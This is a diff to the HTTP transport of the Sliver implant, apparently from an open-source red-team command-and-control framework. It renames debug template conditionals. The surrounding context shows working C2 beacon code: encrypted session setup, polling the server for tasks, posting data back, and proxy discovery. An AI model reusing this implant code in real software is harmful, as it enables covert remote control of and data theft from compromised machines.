@@ -18,7 +18,7 @@ package transports
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if .HTTPc2Enabled}}
+// {{if .Config.HTTPc2Enabled}}
 
 // Procedural C2
 // ===============
@@ -41,7 +41,7 @@ import (
 	"strings"
 
 	"sync"
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
@@ -94,10 +94,10 @@ type SliverHTTPClient struct {
 func (s *SliverHTTPClient) SessionInit() error {
 	publicKey := s.getPublicKey()
 	if publicKey == nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Invalid public key")
 		// {{end}}
-		return errors.New("{{if .Debug}}Invalid public key{{end}}")
+		return errors.New("{{if .Config.Debug}}Invalid public key{{end}}")
 	}
 	sKey := RandomAESKey()
 	s.SessionKey = &sKey
@@ -105,7 +105,7 @@ func (s *SliverHTTPClient) SessionInit() error {
 	data, _ := proto.Marshal(httpSessionInit)
 	encryptedSessionInit, err := RSAEncrypt(data, publicKey)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("RSA encrypt failed %v", err)
 		// {{end}}
 		return err
@@ -129,32 +129,32 @@ func (s *SliverHTTPClient) newHTTPRequest(method, uri string, encoderNonce int, 
 
 func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	uri := s.txtURL()
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
 	nonce, encoder := encoders.RandomEncoder()
 	req := s.newHTTPRequest(http.MethodGet, uri, nonce, nil)
 	resp, err := s.Client.Do(req)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[http] Failed to fetch server public key: %v", err)
 		// {{end}}
 		return nil
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[http] <- %d Server key response", resp.StatusCode)
 	// {{end}}
 	respData, _ := ioutil.ReadAll(resp.Body)
 	data, err := encoder.Decode(respData)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[http] Failed to decode response: %s", err)
 		// {{end}}
 		return nil
 	}
 	pubKeyBlock, _ := pem.Decode(data)
 	if pubKeyBlock == nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[http] Failed to parse certificate PEM")
 		// {{end}}
 		return nil
@@ -162,14 +162,14 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 
 	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
 	if certErr == nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[http] Got a valid public key")
 		// {{end}}
 		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
 		return cert.PublicKey.(*rsa.PublicKey)
 	}
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[http] Invalid certificate %v", err)
 	// {{end}}
 	return nil
@@ -180,18 +180,18 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 
 	nonce, encoder := encoders.RandomEncoder()
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[http] sessionInit = %v", sessionInit)
 	// {{end}}
 	payload := encoder.Encode(sessionInit)
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[http] Encoded payload (%d) %v", nonce, payload)
 	// {{end}}
 	reqBody := bytes.NewReader(payload) // Already RSA encrypted
 
 	uri := s.jspURL()
 	req := s.newHTTPRequest(http.MethodPost, uri, nonce, reqBody)
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
 	resp, err := s.Client.Do(req)
@@ -212,7 +212,7 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 		return err
 	}
 	s.SessionID = string(sessionID)
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[http] New session id: %v", s.SessionID)
 	// {{end}}
 	return nil
@@ -226,12 +226,12 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 	uri := s.jsURL()
 	nonce, encoder := encoders.RandomEncoder()
 	req := s.newHTTPRequest(http.MethodGet, uri, nonce, nil)
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
 	resp, err := s.Client.Do(req)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[http] GET failed %v", err)
 		// {{end}}
 		return nil, err
@@ -240,7 +240,7 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 		return nil, errors.New("Non-200 response code")
 	}
 	if resp.StatusCode == 403 {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Server responded with invalid session for %v", s.SessionID)
 		// {{end}}
 		return nil, errors.New("invalid session")
@@ -251,7 +251,7 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 	if 0 < len(respData) {
 		data, err = encoder.Decode(respData)
 		if err != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("Decoding failed %s", err)
 			// {{end}}
 			return nil, err
@@ -270,19 +270,19 @@ func (s *SliverHTTPClient) Send(data []byte) error {
 	nonce, encoder := encoders.RandomEncoder()
 	reader := bytes.NewReader(encoder.Encode(reqData))
 	uri := s.phpURL()
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
 	req := s.newHTTPRequest(http.MethodPost, uri, nonce, reader)
 	resp, err := s.Client.Do(req)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[http] POST failed %v", err)
 		// {{end}}
 		return err
 	}
 	if resp.StatusCode != 200 {
-		return errors.New("{{if .Debug}}HTTP send failed (non-200 resp){{end}}")
+		return errors.New("{{if .Config.Debug}}HTTP send failed (non-200 resp){{end}}")
 	}
 	return nil
 }
@@ -350,14 +350,14 @@ func httpClient(address string, useProxy bool) *SliverHTTPClient {
 	if useProxy {
 		p := proxy.NewProvider("").GetHTTPProxy(client.Origin)
 		if p != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("Found proxy %#v\n", p)
 			// {{end}}
 			proxyURL := p.URL()
 			if proxyURL.Scheme == "" {
 				proxyURL.Scheme = "http"
 			}
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("Proxy URL = '%s'\n", proxyURL)
 			// {{end}}
 			httpTransport.Proxy = http.ProxyURL(proxyURL)
@@ -385,14 +385,14 @@ func httpsClient(address string, useProxy bool) *SliverHTTPClient {
 	if useProxy {
 		p := proxy.NewProvider("").GetHTTPSProxy(client.Origin)
 		if p != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("Found proxy %#v\n", p)
 			// {{end}}
 			proxyURL := p.URL()
 			if proxyURL.Scheme == "" {
 				proxyURL.Scheme = "https"
 			}
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("Proxy URL = '%s'\n", proxyURL)
 			// {{end}}
 			netTransport.Proxy = http.ProxyURL(proxyURL)
